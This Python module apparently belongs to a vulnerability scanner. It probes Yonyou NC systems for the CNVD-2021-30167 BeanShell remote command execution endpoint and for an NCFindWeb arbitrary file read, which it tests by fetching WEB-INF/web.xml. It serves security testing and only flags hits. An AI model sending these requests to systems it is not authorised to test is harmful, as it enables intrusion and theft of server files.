#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    Yonyou扫描类: 
        用友NC BeanShell远程命令执行漏洞
            CNVD-2021-30167
        用友ERP-NC NCFindWeb接口任意文件读取/下载/目录遍历
            暂无编号
'''

from lib.initial.config import config
from lib.tool.md5 import md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests

class Yonyou():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Yonyou'

        self.cnvd_2021_30167_payloads = [
            {
                'path': 'servlet/~ic/bsh.servlet.BshServlet',
                'data': ''
            }
        ]

        self.yonyou_nc_fileRead_payloads = [
            {
                'path': 'NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml',
                'data': ''
            }
        ]

    def cnvd_2021_30167_scan(self, url):
        ''' 用友NC BeanShell远程命令执行漏洞
                给了一个命令执行的页面, 在框框内输入命令, 然后点击按钮就可以运行任意代码
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name + 'NC'
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CNVD-2021-30167'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        headers = self.headers
        headers.update(vul_info['headers'])

        for payload in self.cnvd_2021_30167_payloads:   # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                vul_info['status_code'] = str(res.status_code)
                logger.logging(vul_info)                        # * LOG
            except requests.ConnectTimeout:
                vul_info['status_code'] = 'Timeout'
                logger.logging(vul_info)
                return None
            except requests.ConnectionError:
                vul_info['status_code'] = 'Faild'
                logger.logging(vul_info)
                return None
            except:
                vul_info['status_code'] = 'Error'
                logger.logging(vul_info)
                return None

            if ('BeanShell' in res.text):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def yonyou_nc_fileRead_scan(self, url):
        ''' 用友ERP-NC NCFindWeb接口任意文件读取/下载漏洞
                也可以目录遍历
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name + 'ERP-NC'
        vul_info['vul_type'] = 'FileRead'
        vul_info['vul_id'] = 'NC-fileRead'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        headers = self.headers
        headers.update(vul_info['headers'])

        for payload in self.yonyou_nc_fileRead_payloads:# * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                vul_info['status_code'] = str(res.status_code)
                logger.logging(vul_info)                        # * LOG
            except requests.ConnectTimeout:
                vul_info['status_code'] = 'Timeout'
                logger.logging(vul_info)
                return None
            except requests.ConnectionError:
                vul_info['status_code'] = 'Faild'
                logger.logging(vul_info)
                return None
            except:
                vul_info['status_code'] = 'Error'
                logger.logging(vul_info)
                return None

            if (('nc.bs.framework.server' in res.text) or ('WebApplicationStartupHook' in res.text)):
                results = {
                    'Target': target,
                    'Type': [vul_info['vul_type'], vul_info['app_name'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def addscan(self, url):
        return [
            thread(target=self.cnvd_2021_30167_scan, url=url),
            thread(target=self.yonyou_nc_fileRead_scan, url=url),
        ]

yonyou = Yonyou()